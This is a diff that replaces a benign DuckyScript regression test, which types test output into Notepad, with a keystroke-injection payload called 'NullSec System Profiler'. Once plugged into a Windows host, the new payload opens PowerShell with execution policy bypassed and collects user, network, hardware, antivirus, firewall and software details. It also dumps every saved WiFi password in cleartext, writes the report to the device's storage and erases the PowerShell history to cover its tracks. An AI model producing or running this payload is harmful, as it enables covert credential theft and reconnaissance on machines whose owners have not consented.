@@ -1,176 +1,158 @@
-REM ═══════════════════════════════════════════════════════════════
-REM kducky Official Regression Payload
-REM Version: 1.2 — Full Demo (opens Notepad via GUI r)
-REM
-REM This payload opens the Windows Run dialog (GUI r), launches
-REM Notepad, then types the full DuckyScript 3 regression test
-REM output into Notepad.
-REM
-REM Execution order builds from basic to advanced features.
-REM The payload runs to completion and types "all_done".
-REM
-REM   1. Open Notepad (GUI r → "notepad" → ENTER)
-REM   2. Preprocessor
-REM   3. Variables
-REM   4. Expressions
-REM   5. Control flow (IF/ELSE/WHILE/BREAK/CONTINUE)
-REM   6. Functions (definition, call, return value)
-REM   7. Random + STRING output
-REM   8. HOLD/RELEASE (SHIFT + SPACE only)
-REM   9. RESET
-REM  10. Layout switching (DUCKY_LANG)
-REM  11. DELAY / DEFAULTDELAY / DEFAULTCHARDELAY
-REM  12. REPEAT
-REM  13. LED blink pattern
-REM  14. Payload hide/restore
-REM
-REM Everything runs to completion and types "all_done" at the end.
-REM ═══════════════════════════════════════════════════════════════
+DELAY 1500
+REM ====================================================
+REM Title:         NullSec System Profiler
+REM Author:        NullSec (bad-antics)
+REM Description:   Comprehensive system reconnaissance
+REM                Collects hardware, software, network,
+REM                and security configuration details.
+REM                Saves report to Ducky mass storage.
+REM Target:        Windows 10/11
+REM Version:       1.1
+REM Category:      Recon
+REM ====================================================
 
-REM ── Open Notepad (GUI r) ─────────────────────────────────────
-REM Wait for host to detect the HID keyboard
+DEFINE #LABEL DUCKY
 
-DELAY 1000
-GUI r
-DELAY 500
-STRING notepad
-ENTER
-DELAY 1000
+REM Use PASSIVE_WINDOWS_DETECT for reliable keystroke timing
+EXTENSION PASSIVE_WINDOWS_DETECT
+    REM VERSION 1.1
+    REM AUTHOR: Korben
 
-REM ── SECTION 1: Preprocessor (text-level, before lexer) ────────
+    REM_BLOCK DOCUMENTATION
+        Windows fully passive OS Detection and passive Detect Ready
+        Includes its own passive detect ready.
+        Does not require additional extensions.
 
-DEFINE #DELAY_VAL 50
-DEFINE #STR Hello world
-DEFINE #TEXT safe_regression
+        USAGE:
+            Extension runs inline (here)
+            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
+            boot delay
+            $_OS will be set to WINDOWS or NOT_WINDOWS
+            See end of payload for usage within payload
+    END_REM
 
-REM ── SECTION 2: Variables (interpreter state) ──────────────────
+    REM CONFIGURATION:
+    DEFINE #MAX_WAIT 150
+    DEFINE #CHECK_INTERVAL 20
+    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
+    DEFINE #NOT_WINDOWS 7
 
-VAR $counter = 0
-VAR $max = 5
-VAR $result = 0
-$counter = 1
-VAR $t = TRUE
-VAR $f = FALSE
-VAR $name = TRUE
+    $_OS = #NOT_WINDOWS
 
-REM ── SECTION 3: Expressions (arithmetic, bitwise, shift) ───────
+    VAR $MAX_TRIES = #MAX_WAIT
+    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
+        DELAY #CHECK_INTERVAL
+        $MAX_TRIES = ($MAX_TRIES - 1)
+    END_WHILE
+    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
+        $_OS = WINDOWS
+    END_IF
 
-VAR $calc = (1 + 2) * 3
-$calc = $calc ^ 2
-VAR $flags = $calc & 0xFF
-VAR $shifted = 1 << 3
-VAR $combined = $flags | $shifted
+END_EXTENSION
 
-REM ── SECTION 4: Control Flow (IF/ELSE/WHILE/BREAK/CONTINUE) ────
-
-IF ($counter == 1) THEN
-  STRINGLN counter_is_one
-ELSE IF ($counter == 2) THEN
-  STRINGLN counter_is_two
-ELSE
-  STRINGLN other
+IF ($_OS != WINDOWS) THEN
+    REM Not a Windows host — bail out cleanly
+    STOP_PAYLOAD
 END_IF
 
-WHILE ($max > 0)
-  $max = $max - 1
-  IF ($max == 3) THEN
-    CONTINUE
-  END_IF
-  IF ($max == 0) THEN
-    BREAK
-  END_IF
-  STRINGLN loop_body
-END_WHILE
-
-REM ── SECTION 5: Functions (definition, call, return) ───────────
-
-FUNCTION greet()
-  STRINGLN hello_from_fn
-END_FUNCTION
-greet()
-
-FUNCTION add()
-  VAR $local = 0
-  $local = 100
-  RETURN 42
-END_FUNCTION
-VAR $fn_result = add()
-
-REM ── SECTION 6: Random + STRING output (platform typing) ──────
-
-RANDOM_CHAR
-RANDOM_LETTER
-RANDOM_NUMBER
-RANDOM_SPECIAL
-RANDOM_LOWERCASE_LETTER
-RANDOM_UPPERCASE_LETTER
-
-REM DEFINE substitution tested here
-DELAY #DELAY_VAL
-STRINGLN #STR
-STRINGLN prefix_#TEXT
-
-REM ── SECTION 7: HOLD/RELEASE (SHIFT for caps, SPACE) ──────────
-REM Only SHIFT and SPACE — no CTRL, ALT, or GUI modifiers.
-
-INJECT_MOD
-HOLD SHIFT
-STRING a
-INJECT_MOD
-RELEASE SHIFT
-
-HOLD SPACE
-DELAY 50
-RELEASE SPACE
-
-REM SHIFT ENTER types a new line (safe in any text editor)
-SHIFT ENTER
-
-REM INJECT_MOD standalone exercises parser path
-INJECT_MOD
-
-REM ── SECTION 8: RESET ─────────────────────────────────────────
-
-RESET
-STRINGLN reset_complete
-
-REM ── SECTION 9: Layout switching (platform state) ─────────────
-
-DUCKY_LANG DE
-STRINGLN ae
-DUCKY_LANG US
-STRINGLN back_to_us
-
-REM ── SECTION 10: DELAY / DEFAULTDELAY / DEFAULTCHARDELAY ─────
-
-DELAY 50
-DEFAULTDELAY 30
-DEFAULTCHARDELAY 5
-STRINGLN delay_test_done
-
-REM ── SECTION 11: REPEAT ──────────────────────────────────────
-
-STRINGLN repeat_me
-REPEAT 2
-
-REM ── SECTION 12: LED blink pattern ────────────────────────────
-
-LED_G
-DELAY 1000
-LED_OFF
+REM Open PowerShell hidden
+GUI r
 DELAY 500
-LED_G
-DELAY 1500
-LED_OFF
+STRINGLN powershell -ExecutionPolicy Bypass
+DELAY 1250
+
+REM Find the Ducky drive
+STRINGLN $d=(Get-CimInstance Win32_LogicalDisk|?{$_.VolumeName -eq '#LABEL'}).DeviceID;if(!$d){$d=$env:TEMP}
+DELAY 300
+
+REM Build comprehensive report
+STRINGLN $r=@();$r+="=== NULLSEC SYSTEM PROFILER ==="
+DELAY 100
+STRINGLN $r+="Timestamp: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+DELAY 100
+STRINGLN $r+="Hostname: $env:COMPUTERNAME"
+DELAY 100
+STRINGLN $r+="Username: $env:USERNAME"
+DELAY 100
+STRINGLN $r+="Domain: $env:USERDOMAIN"
+DELAY 100
+
+REM OS Information
+STRINGLN $r+="`n=== OPERATING SYSTEM ==="
+DELAY 100
+STRINGLN $os=Get-CimInstance Win32_OperatingSystem;$r+="OS: $($os.Caption) $($os.Version)"
+DELAY 100
+STRINGLN $r+="Build: $($os.BuildNumber) | Arch: $($os.OSArchitecture)"
+DELAY 100
+STRINGLN $r+="Install Date: $($os.InstallDate)"
+DELAY 100
+STRINGLN $r+="Last Boot: $($os.LastBootUpTime)"
+DELAY 100
+
+REM Hardware
+STRINGLN $r+="`n=== HARDWARE ==="
+DELAY 100
+STRINGLN $cpu=Get-CimInstance Win32_Processor;$r+="CPU: $($cpu.Name) ($($cpu.NumberOfCores) cores)"
+DELAY 200
+STRINGLN $ram=Get-CimInstance Win32_PhysicalMemory|Measure-Object -Property Capacity -Sum;$r+="RAM: $([math]::Round($ram.Sum/1GB,2)) GB"
+DELAY 200
+STRINGLN Get-CimInstance Win32_DiskDrive|%{$r+="Disk: $($_.Model) - $([math]::Round($_.Size/1GB,1)) GB"}
+DELAY 200
+STRINGLN $gpu=Get-CimInstance Win32_VideoController;$r+="GPU: $($gpu.Name)"
+DELAY 200
+
+REM Network
+STRINGLN $r+="`n=== NETWORK ==="
+DELAY 100
+STRINGLN Get-NetIPAddress -AddressFamily IPv4|?{$_.IPAddress -ne '127.0.0.1'}|%{$r+="IP: $($_.IPAddress)/$($_.PrefixLength) ($($_.InterfaceAlias))"}
+DELAY 300
+STRINGLN $r+="Gateway: $((Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue).NextHop)"
+DELAY 200
+STRINGLN $dns=Get-DnsClientServerAddress -AddressFamily IPv4|Select-Object -ExpandProperty ServerAddresses -Unique;$r+="DNS: $($dns -join ', ')"
+DELAY 200
+STRINGLN $r+="Public IP: $((Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing -TimeoutSec 5).Content)"
+DELAY 500
+
+REM WiFi Profiles
+STRINGLN $r+="`n=== WIFI PROFILES ==="
+DELAY 100
+STRINGLN $profiles=netsh wlan show profiles|Select-String 'All User Profile'|%{($_ -split ':')[1].Trim()};$r+="Saved Networks: $($profiles.Count)"
+DELAY 300
+STRINGLN foreach($p in $profiles){try{$key=netsh wlan show profile name="$p" key=clear|Select-String 'Key Content'|%{($_ -split ':')[1].Trim()};$r+="  $p : $key"}catch{}}
 DELAY 1000
-LED_G
+
+REM Security
+STRINGLN $r+="`n=== SECURITY ==="
+DELAY 100
+STRINGLN $av=Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue;$r+="AV: $($av.displayName -join ', ')"
 DELAY 200
-LED_OFF
+STRINGLN $fw=Get-NetFirewallProfile|%{"$($_.Name):$($_.Enabled)"};$r+="Firewall: $($fw -join ', ')"
 DELAY 200
-LED_G
+STRINGLN $r+="UAC: $((Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).EnableLUA)"
 DELAY 200
-LED_OFF
+STRINGLN $r+="BitLocker: $((Get-BitLockerVolume -MountPoint C: -ErrorAction SilentlyContinue).ProtectionStatus)"
 DELAY 200
-HIDE_PAYLOAD
-RESTORE_PAYLOAD
-STRINGLN all_done
+
+REM Installed Software
+STRINGLN $r+="`n=== INSTALLED SOFTWARE (Top 30) ==="
+DELAY 100
+STRINGLN Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*|Sort-Object InstallDate -Descending|Select-Object -First 30|%{$r+="  $($_.DisplayName) v$($_.DisplayVersion)"}
+DELAY 500
+
+REM Running Processes
+STRINGLN $r+="`n=== TOP PROCESSES (by memory) ==="
+DELAY 100
+STRINGLN Get-Process|Sort-Object WorkingSet64 -Descending|Select-Object -First 15|%{$r+="  $($_.ProcessName) - $([math]::Round($_.WorkingSet64/1MB,1)) MB (PID: $($_.Id))"}
+DELAY 300
+
+REM Save report
+STRINGLN $r+= "`n=== END REPORT ==="
+DELAY 100
+STRINGLN $r -join "`n"|Out-File "$d\system_profile_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt" -Encoding UTF8
+DELAY 500
+
+REM WARNING: The following line deletes ALL PowerShell history.
+REM Comment out if you want to preserve command history.
+STRINGLN Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
+
+STRINGLN exit
